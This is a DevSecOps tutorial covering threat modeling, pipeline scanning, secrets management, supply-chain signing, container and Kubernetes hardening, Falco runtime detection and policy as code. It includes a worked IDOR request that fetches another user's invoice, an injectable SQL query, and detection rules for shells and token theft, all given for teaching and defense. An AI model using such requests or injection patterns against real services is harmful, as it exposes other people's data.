Security & DevSecOps: The Complete Guide

Build security into every stage of the software lifecycle — from threat modeling and pipeline scanning to container, Kubernetes, and cloud hardening — so security is everyone's job, automated and continuous.

📖 How to read this guide

Each topic: what, why it matters, how to implement, and ★ best practice. This guide ties together the security threads running through the CI/CD, Docker, Kubernetes, and Cloud guides.

1. What is DevSecOps?

DevSecOps means baking security into DevOps — automated, continuous, and owned by everyone — instead of a gate at the end run by a separate team.

DevSecOps = security is everyone's job, automated

The old way: developers build for months, then a security team reviews at the end and finds problems too late to fix cheaply. DevSecOps bakes security checks into the everyday pipeline — like spell-check running as you type instead of a proofreader at the very end. Small, automated, continuous checks catch issues immediately, and the whole team owns security rather than tossing it over a wall.

Why DevSecOps exists

The classic "security as a final gate" model breaks down at DevOps velocity. When teams deploy dozens of times per day, a manual security review that takes days becomes the bottleneck that either blocks releases or gets skipped entirely. Worse, the economics are brutal: an IBM Systems Sciences study found a defect caught in design costs roughly 1×, in build ~6×, in QA ~15×, and in production ~100× to fix. Security bugs follow the same curve — but a production security bug is not just expensive, it can be a data breach. DevSecOps exists to make the secure path the fast path, so security scales with delivery speed instead of fighting it.

How it works under the hood

DevSecOps is three things working together: (1) automation — every security check runs as code in the pipeline (SAST, SCA, secret scanning, IaC scanning, image scanning) so there is no human in the critical path for routine checks; (2) guardrails, not gates — policies are encoded (OPA/Kyverno, pre-commit hooks) so violations are caught at the earliest possible moment with a clear, fast feedback loop back to the author; (3) shared ownership — developers get security findings inside their normal tools (IDE, PR comments), and a small security team builds the platform and paved roads rather than manually reviewing every change.

A minimal DevSecOps gate in a pipeline (GitHub Actions)
name: security-gate
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Secret scan (fail if any secret found)
        run: gitleaks detect --no-banner --redact
      - name: SAST
        uses: returntocorp/semgrep-action@v1
      - name: Dependency + IaC scan
        run: trivy fs --severity HIGH,CRITICAL --exit-code 1 .
What a developer sees when the gate blocks a bad PR
gitleaks: leak found
  File:   src/config/db.js
  Secret: AKIA****************  (AWS access key)
  Rule:   aws-access-token
  Commit: 8f2a1c9
##[error] Process completed with exit code 1
# → PR is blocked; author rotates the key and removes it before merge
Common mistakes when adopting DevSecOps
  • Turning on every scanner at "fail on all" — floods developers with noise, they lose trust and disable it. Start at high/critical only.
  • Making security a separate pipeline that runs after merge — that is just the old gate in a new place. Checks must run in the PR, before merge.
  • No owner for findings — a dashboard nobody looks at is not security. Findings need to route to the person who can fix them.
  • Treating it as a tool purchase — DevSecOps is mostly culture and process; tools are ~20% of it.
Mental model: the airport vs the TSA line

Old-school security is one big TSA checkpoint at the end — everyone piles up, it's slow, and if you fail you go all the way back. DevSecOps is more like a modern airport where your ID, bag, and boarding pass are checked continuously at small touchpoints along the way. Each check is fast and specific, so problems surface early and you almost never get sent back to the start.

2. Core Principles — CIA & Zero Trust

PrincipleMeaning
ConfidentialityOnly authorized parties can read data (encryption, access control)
IntegrityData isn't tampered with (signing, checksums)
AvailabilitySystems stay up for legitimate users (DDoS protection, redundancy)
Least privilegeGrant the minimum access needed, nothing more
Defense in depthMultiple layers, so one failure isn't a breach
Zero TrustNever trust by network location; verify every request explicitly
Zero Trust in practice

The old model trusted anything "inside the network." Zero Trust assumes the network is already hostile: every service authenticates every request (mTLS, tokens), regardless of origin. The service mesh mTLS and NetworkPolicies are Zero Trust building blocks.

Why the CIA triad exists

Every security control you will ever build serves at least one of these three goals, so the triad is the vocabulary that lets you reason about tradeoffs. It exists because "make it secure" is meaningless until you decide what property you are protecting. Encrypting a database protects confidentiality but does nothing for availability; adding replicas improves availability but can widen the confidentiality attack surface. Naming the property forces you to be explicit and reveals when a control for one pillar quietly weakens another.

How each pillar is actually enforced under the hood

  • Confidentiality = encryption (AES-GCM at rest, TLS in transit) + access control (IAM, RBAC). The data is unreadable without the key, and the key is only released to authorized identities.
  • Integrity = cryptographic hashing and signatures. A SHA-256 hash detects accidental change; an HMAC or digital signature detects malicious change because the attacker cannot forge it without the key.
  • Availability = redundancy + rate limiting + DDoS absorption. It is a security property because an attacker who takes you offline has defeated you just as surely as one who steals data.

How Zero Trust verifies a single request

Concretely, when service A calls service B in a Zero Trust mesh, every request is evaluated fresh — there is no "we already let this IP in":

  1. Identity: A presents a cryptographic identity (an mTLS client certificate, e.g. a SPIFFE ID like spiffe://cluster/ns/payments/sa/api). B verifies the cert chains to the mesh CA.
  2. Authorization: B checks a policy — "is payments/api allowed to call POST /charge?" — evaluated per-request, not per-connection.
  3. Context: modern implementations also factor in device posture, token freshness, and anomaly signals before granting access.
Zero Trust authorization: only the "api" identity may call "db" (Istio)
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata: { name: db-allow-api-only, namespace: payments }
spec:
  selector: { matchLabels: { app: db } }
  action: ALLOW
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/payments/sa/api"]  # verified via mTLS
      to:
        - operation: { ports: ["5432"] }
# Any other identity — even from inside the same namespace — is DENIED by default.
Common mistakes around CIA & Zero Trust
  • "We have a firewall, so the internal network is trusted." This is exactly the assumption Zero Trust rejects — one phished laptop and the attacker moves laterally unchecked.
  • Confusing encryption with integrity. Encrypting data (confidentiality) does not prove it wasn't swapped; you also need authenticated encryption or a signature for integrity.
  • Ignoring availability as a security concern. Ransomware and DDoS attack availability directly.
  • "Zero Trust" as a product you buy. It is an architecture (strong identity + per-request authz + least privilege + assume-breach), not a SKU.
Mental model: nightclub with per-drink ID checks

Perimeter security is a bouncer at the door — once you're in, you can go anywhere. Zero Trust is a club where a staff member checks your wristband at every bar, every VIP room, every time — even if you were let in five minutes ago. Annoying for an intruder, invisible for a legitimate guest whose wristband is always valid.

3. Threat Modeling

Before building defenses, ask: what are we protecting, from whom, and how might they attack? A lightweight threat model early prevents expensive redesigns.

STRIDE — a simple threat checklist

For each component ask about Spoofing (impersonation), Tampering (modification), Repudiation (denying actions), Information disclosure (leaks), Denial of service, and Elevation of privilege. Diagram your data flows, mark trust boundaries, and walk STRIDE across each boundary. An hour of this at design time saves weeks later.

Why threat modeling exists

You cannot defend against threats you have never named. Threat modeling exists to make the implicit explicit before code is written, when changing the design costs a conversation instead of a rewrite. It answers four questions in order: What are we building? What can go wrong? What are we going to do about it? Did we do a good job? Skipping it is how teams ship an admin endpoint with no authz or a message queue that trusts any publisher — flaws that no scanner will flag because they are design decisions, not bugs.

How it works under the hood: data flow + trust boundaries

The mechanical core is a data flow diagram (DFD) annotated with trust boundaries — the lines where data crosses from a less-trusted zone to a more-trusted one (internet → load balancer, app → database, tenant A → tenant B). Every arrow that crosses a boundary is where you apply STRIDE, because that crossing is where an attacker gets leverage. Each identified threat maps to a mitigation category: Spoofing→authentication, Tampering→integrity/signing, Repudiation→logging, Info disclosure→encryption/authz, DoS→rate-limits/quotas, Elevation→least-privilege/authz.

STRIDE walk of one trust boundary: browser → API
Boundary: Internet (untrusted) --> API service (trusted)
Data flow: HTTP request carrying user JWT + JSON body

S  Spoofing            -> forge another user's session   -> verify JWT signature + exp/aud/iss
T  Tampering           -> alter price field in cart body  -> server recomputes price; never trust client
R  Repudiation         -> "I never placed that order"     -> append-only audit log w/ user id + ts
I  Info disclosure     -> error leaks stack trace / SQL   -> generic errors in prod; log details server-side
D  Denial of Service   -> flood /login                    -> rate limit + WAF + autoscale
E  Elevation of priv.  -> /admin reachable by normal user -> server-side role check on every admin route
Common threat-modeling mistakes
  • Modeling only the happy path. Attackers use the paths you didn't draw — background jobs, admin tools, internal APIs, the "temporary" debug endpoint.
  • Making it a giant one-time document. A threat model that isn't revisited when the design changes rots. Keep it lightweight and living.
  • Stopping at "identify." A threat without a tracked mitigation (an actual ticket) is just anxiety.
  • Ignoring the human/process boundary — e.g., who can approve a deploy, who holds the KMS key.
Mental model: planning a bank heist against yourself

Before opening a bank, you'd walk the floor as a robber: Where's the cash? How would I get in? Which door is unlocked at night? Threat modeling is playing the attacker against your own design on paper — cheap, fast, and it tells you exactly which doors to lock before you've poured the concrete.

4. Security in the SDLC

Every phase of development gets its own automated security controls.

PhaseControl
CodeSecret scanning (gitleaks), pre-commit hooks, secure coding, code review
BuildSCA (dependency scanning), SAST, SBOM generation
TestDAST against a running app, container image scanning
DeployImage signing verification, policy admission control, IaC scanning
OperateRuntime detection, CSPM, vulnerability re-scanning, audit logs

Why a secure SDLC exists

A single scan at one point in time only catches the bugs visible at that point. Vulnerabilities enter at every phase — a bad design decision, a typo in code, a vulnerable dependency pulled in at build, a misconfigured deploy, a CVE disclosed after you shipped. The secure SDLC exists because each phase has a distinct threat surface, and the cheapest place to catch a given class of flaw is the phase where it is introduced. Layering controls across phases is defense-in-depth applied to the delivery pipeline itself.

How the controls chain together

The controls form a ratchet: each phase assumes the previous ones can fail. Secret scanning at commit catches leaks before they hit history; SAST at build catches injection patterns the developer missed; SCA catches a vulnerable library the developer didn't know was transitive; image scanning catches OS-level CVEs the app author never touched; admission control at deploy refuses anything unsigned even if every earlier gate was bypassed; runtime detection catches the exploit of a zero-day that no scanner could have known about. No single layer is trusted to be complete.

One pipeline, controls at each phase
stages:
  - code:    { run: "gitleaks detect && pre-commit run --all-files" }
  - build:   { run: "trivy fs --exit-code 1 --severity HIGH,CRITICAL . && semgrep ci && syft . -o spdx-json > sbom.json" }
  - test:    { run: "zap-baseline.py -t https://staging.example.com" }
  - release: { run: "cosign sign --key env://COSIGN_KEY $IMAGE" }
  - deploy:  { run: "kubectl apply -f k8s/  # Kyverno admission verifies signature" }
  - operate: { run: "falco &  # runtime detection, + nightly 'trivy image' re-scan" }
Common secure-SDLC mistakes
  • Only scanning at build. A CVE disclosed after release means yesterday's "clean" image is today's vulnerable one — you need scheduled re-scanning in Operate.
  • Gates that don't actually block. A scan whose result is ignored is theater. At minimum, high/critical must fail the build.
  • No feedback loop to the author. Findings surfacing days later in a separate tool get ignored; put them in the PR.
  • Design phase skipped. Threat modeling (§3) is the "shift-left-est" control and the one most often omitted.
Mental model: quality control on an assembly line

You don't inspect a car only after it rolls off the line — you check the welds, then the paint, then the electronics, then a final road test. Each station catches the defects it's best positioned to see. The secure SDLC puts a security inspector at every station instead of one overwhelmed inspector at the exit.

5. SAST, DAST & SCA

The three pillars of automated application security scanning — each finds different classes of problems.

TypeWhat it scansFindsTools
SASTYour source code (static)Injection, hardcoded secrets, insecure patternsSemgrep, SonarQube, CodeQL
SCAYour dependenciesKnown CVEs in libraries you importDependabot, Trivy, Snyk
DASTThe running app (dynamic)Runtime flaws, misconfig, auth issuesOWASP ZAP, Burp
Scanning in CI (fail on high severity)
- name: Secret scan
  run: gitleaks detect --no-banner
- name: Dependency + image scan (SCA)
  run: trivy fs --severity HIGH,CRITICAL --exit-code 1 .
- name: SAST
  run: semgrep ci        # fails on findings per your ruleset
Tune out the noise or lose the team

Scanners produce false positives. If every build fails on low-severity noise, developers disable them. Start by failing only on high/critical, triage findings, maintain an allow-list for accepted risks, and tighten over time. Actionable signal beats overwhelming noise.

How SAST, DAST and SCA differ mechanically

They are not three brands of the same thing — they inspect fundamentally different artifacts using different techniques, which is why mature programs run all three:

  • SAST parses your source into an abstract syntax tree (AST) and often a data-flow/taint graph. It traces whether untrusted input (a "source" like request.body) reaches a dangerous "sink" (like db.query()) without passing through a sanitizer. It sees all code paths, including ones tests never hit — but it has no runtime context, so it produces false positives.
  • SCA doesn't analyze your code at all — it reads your dependency manifests/lockfiles (package-lock.json, go.sum, image layers), resolves the full transitive tree, and matches each component+version against vulnerability databases (NVD, GitHub Advisories, OSV). It answers "am I shipping a library with a known CVE?"
  • DAST is a black box — it doesn't see code, it attacks the running app over HTTP, sending malicious payloads (SQLi strings, XSS vectors, auth-bypass attempts) and observing responses. It finds real, exploitable, runtime issues (including misconfig and auth flaws) but only on the paths it can reach and only after the app is deployed.
The same SQL-injection bug seen by each tool
# SAST (Semgrep) — sees the tainted string reach the query at build time:
semgrep --config=p/sql-injection app.py
#   app.py:14  Detected user input in SQL string. Use parameterized queries.
#              cursor.execute("SELECT * FROM users WHERE id = " + request.args['id'])

# SCA (Trivy) — sees a vulnerable driver, unrelated to your code:
trivy fs .
#   sqlparse 0.4.1  CVE-2023-30608  HIGH  fixed in 0.4.4

# DAST (OWASP ZAP) — proves it's exploitable on the running app:
zap-cli quick-scan http://localhost:8000
#   High: SQL Injection at GET /user?id=1'  (DB error surfaced in response)
Common SAST/DAST/SCA mistakes
  • Relying on one type. SAST misses runtime/config flaws; DAST misses unreachable-but-real code paths; SCA misses your own bugs. They are complementary, not substitutes.
  • Running DAST against production without care — it sends real attack payloads and can create junk data or trigger DoS. Point it at staging.
  • Ignoring transitive dependencies. Most CVEs come from libraries your libraries pulled in, not your direct deps.
  • Treating SCA "vulnerable" as "exploitable." Use reachability analysis / the SBOM to prioritize CVEs on code paths you actually use.
Mental model: three ways to check a house is safe

SAST is an architect reading the blueprints for design flaws. SCA is checking whether any appliances you installed have been recalled. DAST is a locksmith who actually walks up and tries every door and window. You want all three — the blueprint review won't catch a recalled toaster, and the locksmith won't read blueprints.

6. Secrets Management

Hardcoded secrets are the most common serious leak. Never store credentials in code, images, or plain env files in the repo.

Secrets hierarchy of good→best
  1. Secrets in a manager (Vault, AWS Secrets Manager), injected at runtime.
  2. Dynamic secrets — short-lived credentials generated per-request, auto-expiring.
  3. Rotate regularly and on any suspicion; audit every access.
  4. Scan repos & history for leaks (gitleaks); if leaked, rotate immediately — removing from Git history is not enough.

Why secrets management exists

A secret in source code is a secret shared with everyone who ever cloned the repo, every CI runner, every backup, every fork, and — via the Git history — everyone forever, even after you "delete" it. Secrets management exists to break the link between "the app can use the credential" and "the credential is copied everywhere." The goal is that a credential lives in exactly one authoritative place, is handed to workloads just-in-time, and every access is logged so you can answer "who used this and when?"

How runtime secret injection works under the hood

The app never holds a static credential. Instead it proves who it is using an identity it already has — a Kubernetes ServiceAccount token, an AWS IAM role, a cloud instance identity document — and exchanges that identity for a secret. The secrets manager verifies the identity against a policy ("the payments/api service account may read db/creds"), returns the secret over TLS into process memory, and logs the access. Nothing sensitive touches disk, the image, or Git.

Kubernetes workload fetches a secret by proving its identity (no static token)
# The pod presents its ServiceAccount JWT; Vault verifies it with the K8s API,
# maps it to a policy, and returns a secret — all at startup, in memory:
JWT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
vault write auth/kubernetes/login role=payments-api jwt="$JWT"
#   token: hvs.CAES...        (a short-lived Vault token, not the DB password)
vault kv get -field=password secret/payments/db
#   s3cr3t-rotated-nightly    (delivered over TLS, never written to disk)
The audit trail every access produces
{"time":"2026-09-27T14:31Z","type":"response","auth":{"display_name":"payments-api"},
 "request":{"operation":"read","path":"secret/payments/db"},"remote_address":"10.1.4.7"}
Common secrets mistakes
  • Hardcoded secrets in code, Dockerfiles (ENV DB_PASS=...), or CI YAML committed to the repo — the #1 real-world leak.
  • "It's in a private repo, so it's fine." Private repos get forked, cloned to laptops, and made public by accident. Treat any secret in Git as compromised.
  • Base64 == encryption. Kubernetes Secrets are base64-encoded, not encrypted; anyone with get secret RBAC reads them in plaintext. Enable etcd encryption + use a real manager.
  • Deleting a leaked secret from the latest commit — it's still in history and on every clone. You must rotate the actual credential.
  • Passing secrets as build args — they get baked into image layers and leak via docker history.
Mental model: hotel key cards vs a master key under the mat

Hardcoding a secret is leaving the master key under the doormat — anyone who knows to look gets in forever. A secrets manager is the front desk: you show ID, they issue a key card that opens only your room and stops working at checkout, and every use is logged. Lost cards are trivially deactivated; a lost master key means re-keying the whole building.

7. Supply Chain Security

Attackers increasingly target the build pipeline and dependencies rather than the app directly. Prove what you build and verify what you run.

The four defenses
  • SBOM — know every component in your artifacts (answer "are we affected by CVE-X?" instantly).
  • Signing — cryptographically sign artifacts (cosign) so tampering is detectable.
  • Provenance (SLSA) — a signed record of how/where an artifact was built.
  • Verification — admission controllers refuse unsigned/unknown images.

Full walkthrough with commands in the CI/CD supply-chain section and Docker SBOM section.

Why supply chain security exists

Modern apps are mostly other people's code — a typical service is 80–90% third-party dependencies by line count. Attackers noticed that compromising one popular library or build server infects thousands of downstream victims at once (SolarWinds, Codecov, the event-stream and xz backdoors, dependency-confusion attacks). Supply chain security exists because your app is only as trustworthy as the least-trustworthy thing that went into building it — including the build system itself.

How signing and verification actually work

Signing uses asymmetric crypto: the build system hashes the artifact and encrypts that hash with a private key, producing a signature. Anyone can verify it with the corresponding public key — if the artifact were tampered with, its hash wouldn't match and verification fails. Modern "keyless" signing (Sigstore/cosign) removes the burden of managing private keys: it gets a short-lived certificate tied to an OIDC identity (e.g., the GitHub Actions workflow), signs, and records everything in a public transparency log (Rekor) so tampering with the record itself is detectable. SLSA provenance adds a signed statement of how the artifact was built (source repo, commit, builder), so you can require "built by our trusted CI from our main branch" — not just "signed by someone."

Sign at build, verify at deploy (keyless cosign)
# In CI (identity comes from the workflow's OIDC token — no key to leak):
cosign sign --yes ghcr.io/acme/api@sha256:abc123...
#   tlog entry created at index 90210423   (recorded in Rekor transparency log)

# At deploy / admission time — reject anything not signed by our CI:
cosign verify \
  --certificate-identity-regexp "https://github.com/acme/.*" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/acme/api@sha256:abc123...
#   Verified OK   → allowed to run
# An unsigned or tampered image fails here and never deploys.
Common supply-chain mistakes
  • Trusting mutable tags. image:latest can point to anything tomorrow. Pin by digest (@sha256:...) so what you verified is what you run.
  • Dependency confusion. If your internal package name isn't reserved on the public registry, an attacker publishes a higher version and your build pulls theirs. Use scoped names + a private registry with a lockfile.
  • Signing but never verifying. A signature nobody checks is decoration. Enforce verification at admission.
  • No SBOM. When the next log4shell drops, "are we affected?" should take seconds, not a week of grepping.
  • Unpinned/curl-piped build tooling — curl | bash in CI runs whatever the server serves that day.
Mental model: a tamper-evident seal + ingredients label

An SBOM is the ingredients label on the package — you can instantly check for the ingredient that just got recalled. The signature is the tamper-evident seal — if it's broken, you don't eat it. Provenance is the certificate saying "made in our inspected factory, not a random garage." Together they let you trust food you didn't grow yourself.

Hardened Dockerfiles, distroless, non-root, and SBOM/scanning are covered hands-on in the Docker guide. The Linux namespaces/cgroups section explains why --privileged is dangerous (it strips the isolation that makes containers safe).

Why container security is its own discipline

A container is not a VM. It's just a Linux process wearing a disguise made of namespaces (which give it its own view of PIDs, network, mounts, users) and cgroups (which limit its CPU/memory). Crucially, it shares the host kernel with every other container. That means a kernel vulnerability or a misconfiguration that weakens the disguise can let a process step out onto the host. Container security exists to keep the disguise strong and to minimize the damage if it slips.

How the hardening controls work under the hood

  • Non-root user: if the process runs as UID 0 inside the container and escapes a namespace, it's root on the host. Running as an unprivileged UID means an escape lands as a nobody.
  • Dropped capabilities: Linux splits root's power into ~40 capabilities. A web server needs almost none. Dropping ALL and adding back only NET_BIND_SERVICE removes the kernel powers (CAP_SYS_ADMIN, CAP_SYS_PTRACE) that escapes rely on.
  • Read-only root filesystem: an attacker who lands can't drop a binary or modify the app if the filesystem rejects writes.
  • Minimal/distroless base: no shell, no package manager, no curl means the attacker's toolkit isn't already installed for them, and there are far fewer CVEs to patch.
  • Pin by digest: guarantees the exact bytes you scanned are the exact bytes that run.
A hardened pod securityContext
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  allowPrivilegeEscalation: false        # blocks setuid-based escalation
  readOnlyRootFilesystem: true
  capabilities:
    drop: ["ALL"]
    add:  ["NET_BIND_SERVICE"]           # only if you must bind <1024
  seccompProfile: { type: RuntimeDefault } # filters dangerous syscalls
Scan and prove the image before shipping
trivy image --severity HIGH,CRITICAL --exit-code 1 acme/api:1.4.2
#   Total: 0 (HIGH: 0, CRITICAL: 0)   → passes
docker history acme/api:1.4.2 --no-trunc | grep -i secret   # ensure no baked secrets
Common container mistakes
  • Running as root (the default!) — always set a non-root user.
  • --privileged or mounting /var/run/docker.sock — both are effectively host root. (See §23.)
  • Fat base images (ubuntu, full node) dragging in hundreds of CVEs and a full shell for the attacker.
  • Secrets in ENV or build args — visible via docker inspect/docker history.
  • Never re-scanning. An image clean at build accumulates CVEs as new ones are disclosed.
Mental model: apartments vs houses

VMs are separate houses — each with its own foundation and plumbing (kernel). Containers are apartments in one building sharing the same foundation. Cheaper and faster, but a fire in one unit (a kernel exploit) threatens the whole building. So you add fire doors and sprinklers (non-root, dropped capabilities, seccomp) — and for truly dangerous tenants you give them a standalone house (gVisor/Kata, §23).

9. Kubernetes Security

Kubernetes hardening checklist
  • Least-privilege RBAC; no wildcard cluster-admin for apps.
  • Pod Security Standards at "restricted" — no privileged, no root, no host mounts.
  • Default-deny NetworkPolicies, then allow only needed flows.
  • Admission control (Kyverno/OPA Gatekeeper) to enforce signed images, resource limits, labels.
  • Secrets in a real manager (External Secrets Operator), not base64 in etcd.
  • Keep the cluster patched; scan node OS too.

Why Kubernetes needs layered security

Kubernetes is a distributed system with a powerful API that can create workloads, mount volumes, and read secrets across a whole fleet. Its defaults favor ease-of-use over safety: pods can run as root, talk to any other pod, and auto-mount a token to the API server. Each layer (RBAC, Pod Security, NetworkPolicy, admission control) closes a different attack path, so a single misconfiguration doesn't hand over the cluster.

How the layers stop an attack chain

Trace a realistic compromise and see which layer catches it: an attacker exploits an app and gets code execution in a pod. NetworkPolicy (default-deny) stops them scanning/reaching other services. Pod Security Standards (restricted) means the pod isn't privileged and isn't root, so kernel-escape paths are closed. The auto-mounted ServiceAccount token — if you disabled automount or scoped RBAC tightly — can't list secrets or create pods. Admission control already refused to run the pod if it was privileged or unsigned in the first place. Each layer assumes the one before it failed.

Find the dangerous defaults in your cluster
# Who can do anything (cluster-admin) — should be a very short list:
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]?.name'

# Pods running as root or privileged (should be none in prod):
kubectl get pods -A -o json | jq -r '.items[]
  | select(.spec.containers[].securityContext.privileged==true)
  | "\(.metadata.namespace)/\(.metadata.name) PRIVILEGED"'

# Can this service account read secrets it shouldn't?
kubectl auth can-i get secrets --as=system:serviceaccount:default:default
#   no    ← what you want
Common Kubernetes security mistakes
  • Wildcard RBAC (verbs: ["*"], resources: ["*"]) or binding apps to cluster-admin "to make it work."
  • No NetworkPolicy — by default every pod can reach every other pod, so one foothold sees everything.
  • Leaving the default ServiceAccount token automounted when the app doesn't call the API.
  • Storing real secrets as Kubernetes Secrets without etcd encryption — they're just base64.
  • No admission control, so a privileged or unsigned pod runs unchallenged.
Mental model: a secure office building

RBAC is your keycard's access list (which doors you may open). Pod Security is the rule that nobody brings dangerous equipment inside. NetworkPolicy is the interior locked doors between departments. Admission control is the security guard at the entrance who turns away anyone without a badge before they get in. Any one alone is bypassable; together they're a real building.

Most cloud breaches are misconfigurations, not exploits. Cloud Security Posture Management (CSPM) continuously checks for them.

Foundations in the Cloud guide

Why cloud posture management exists

In the cloud, a security boundary is one API call away from changing. A single PutBucketAcl can make terabytes public; one over-broad IAM policy can grant an intern's key access to production. There's no physical firewall to hide behind — the control plane is the perimeter. How CSPM works under the hood

It's essentially policy-as-code applied to live infrastructure: "flag any bucket with public read," "flag any security group open to 0.0.0.0/0 on 22." The best setups also scan the Terraform/CloudFormation before apply (Checkov, tfsec) so the misconfig never reaches the account.

Mental model: a building with thousands of doors and one master console

On-prem, you had a fixed building with a guard at the one entrance. The cloud is a building where any authorized person can add a door anywhere with one keystroke. CSPM is the automated system that constantly walks every floor checking "is this door supposed to be here, and is it locked?" — because in a building that reconfigures itself all day, a periodic manual inspection is hopeless.

11. Runtime Detection

Scanning catches known issues before deploy; runtime detection catches attacks happening now.

eBPF-powered runtime security

Tools like Falco and Tetragon use eBPF to watch kernel-level activity in real time — a shell spawning in a container, an unexpected outbound connection, a write to a sensitive path — and alert or block. This is your last line of defense when prevention fails.

Why runtime detection exists

Every preventive control has a blind spot: scanners only know yesterday's CVEs, policies only block what you anticipated, and a zero-day by definition has no signature. Runtime detection exists to catch the exploit as it happens — the moment prevention fails — by watching what processes actually do, not what they claim to be. It's the smoke detector: you hope it never fires, but you don't skip installing it because you have good wiring.

How eBPF-based detection works under the hood

eBPF lets you load tiny, verified programs into the Linux kernel that fire on events — a execve syscall (a program starting), a connect (an outbound network call), an open on a sensitive file. Falco attaches to these hooks and evaluates each event against rules describing abnormal behavior: "a shell was spawned inside a container," "a process wrote to /etc/passwd," "something read the ServiceAccount token then made an outbound connection." Because it observes the kernel directly and out-of-band, the workload can't easily hide from it or be slowed by it.

A Falco rule and the alert it produces
# Rule: a shell should never start inside a running container
- rule: Terminal shell in container
  condition: spawned_process and container and shell_procs and proc.tty != 0
  output: "Shell spawned in container (user=%user.name container=%container.name
           cmd=%proc.cmdline)"
  priority: WARNING
What fires when an attacker execs into a pod
14:32:07 WARNING Shell spawned in container
  (user=root container=payments-api cmd=bash -i
   parent=node k8s.pod=payments-api-7c9 image=acme/api:1.4.2)
# → alert to SIEM/Slack; playbook: cordon pod, snapshot, rotate its secrets
Common runtime detection mistakes
  • Alerting on everything without tuning — legitimate ops (a cron job, an kubectl debug) trips rules and teams start ignoring alerts (alert fatigue).
  • No response playbook. An alert nobody acts on is worthless; define who does what when a rule fires.
  • Detection without prevention. It's the last line, not the only line — you still need hardening, RBAC, and scanning upstream.
  • Not shipping alerts to the SIEM, so they die in a container log nobody reads.
Mental model: a burglar alarm, not a lock

Hardening and scanning are locks and reinforced doors — they keep most intruders out. Runtime detection is the motion sensor inside the house: if someone does get past the locks, it notices the footsteps and calls for help. You want both; a house with great locks and no alarm gets quietly emptied.

12. Compliance & Policy as Code

Encode compliance rules as machine-checked policy instead of PDF checklists, so violations are caught automatically.

Kyverno policy — block privileged pods
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: { name: disallow-privileged }
spec:
  validationFailureAction: Enforce
  rules:
    - name: privileged-containers
      match: { any: [{ resources: { kinds: [Pod] } }] }
      validate:
        message: "Privileged containers are not allowed."
        pattern:
          spec:
            containers:
              - =(securityContext):
                  =(privileged): "false"
Policy as code scales governance

Frameworks like SOC 2, PCI-DSS, HIPAA map many requirements to technical controls. Encode them as OPA/Kyverno policies, IaC scans (Checkov), and CI gates. Auditors get evidence automatically, and drift is caught the moment it happens — far better than annual manual reviews.

Why policy as code exists

Compliance-by-PDF fails because a rule written in a document is only enforced when a human remembers to check it — usually once a year, right before the audit. By then, months of drift have accumulated. Policy as code exists to turn "thou shalt not run privileged containers" from a sentence someone might read into a machine-enforced control that rejects the violation automatically, every time, with an audit log proving it. It converts compliance from a periodic scramble into a continuous property of the system.

How admission-time policy enforcement works

In Kubernetes, every create/update request hits the API server, which calls out to validating admission webhooks (Kyverno, OPA Gatekeeper) before persisting the object. The policy engine evaluates the object against its rules and returns allow/deny. Because it sits in the request path, there's no way to create a non-compliant resource — the rule is enforced at the exact moment of change, and the denial is logged as evidence. OPA uses the Rego language; Kyverno uses YAML patterns (like the example above) that are easier for Kubernetes users.

The policy blocking a violation in real time
kubectl apply -f privileged-pod.yaml
#   Error from server: admission webhook "validate.kyverno.svc" denied the request:
#   policy disallow-privileged/privileged-containers fail:
#   Privileged containers are not allowed.
# → the resource is never created; the denial is captured for the auditor.
Map a compliance requirement to an enforced control
PCI-DSS 2.2.4  "Configure system security parameters to prevent misuse"
  └─ control: no privileged containers
      └─ enforced by: Kyverno ClusterPolicy 'disallow-privileged' (Enforce mode)
          └─ evidence: admission audit log + `kyverno report` PASS/FAIL counts
Common policy-as-code mistakes
  • Deploying policies in Audit mode and never flipping to Enforce. "We log violations" isn't a control; it's a diary.
  • Policies with no exemption mechanism — legitimate edge cases then force people to disable the whole policy.
  • Writing policy that duplicates admission but never scanning IaC, so the violation is caught at deploy instead of in the PR (shift left).
  • Confusing "passing the scan" with "being secure." Frameworks are a floor, not a ceiling.
Mental model: spell-check vs a proofreader

Old compliance is hiring a proofreader who reads the whole book once a year and lists every typo after it's printed. Policy as code is spell-check that refuses to let you type the misspelling in the first place — and keeps a log showing every correction, which is exactly the evidence the auditor wants.

Broken Access Control (the #1 risk) is usually an insecure direct object reference: the server trusts an ID from the client without checking ownership.

Exploiting and fixing a broken-access-control bug (IDOR)
# Attacker is logged in as user 1001 but requests someone else's invoice:
curl -H "Authorization: Bearer <user-1001-token>" https://api.acme.com/invoices/1002
#   200 OK  { "id":1002, "user":1005, "amount": 4200 }   ← LEAK: not their invoice

# Root cause — the query trusts the URL id and ignores who's asking:
#   db.query("SELECT * FROM invoices WHERE id = ?", [req.params.id])

# Fix — scope every object to the authenticated user, server-side:
#   db.query("SELECT * FROM invoices WHERE id = ? AND user_id = ?",
#            [req.params.id, req.user.id])
#   → 404 for invoice 1002; the attacker can't even confirm it exists.

14. Cryptography Fundamentals

Cryptography underpins all security. You don't need to invent algorithms, but you must understand the building blocks to use them correctly — the #1 source of crypto vulnerabilities is misuse, not broken math.

PrimitivePurposeUse
Symmetric (AES-256-GCM)Confidentiality (fast)Encrypting data at rest & bulk traffic
Asymmetric (RSA, ECC)Key exchange & signaturesTLS handshake, signing
Hashing (SHA-256)Integrity (one-way)Checksums, fingerprints

The cardinal rules of crypto
  • Never roll your own crypto or invent schemes — use vetted libraries (libsodium, the language's standard crypto).
  • Never store passwords with plain SHA/MD5 — use bcrypt/scrypt/argon2 (deliberately slow + salted).
  • Use authenticated encryption (AES-GCM), not plain AES-CBC, to prevent tampering.
  • Rotate keys and use a KMS/HSM to store them — never hardcode keys.

Why we combine symmetric and asymmetric crypto

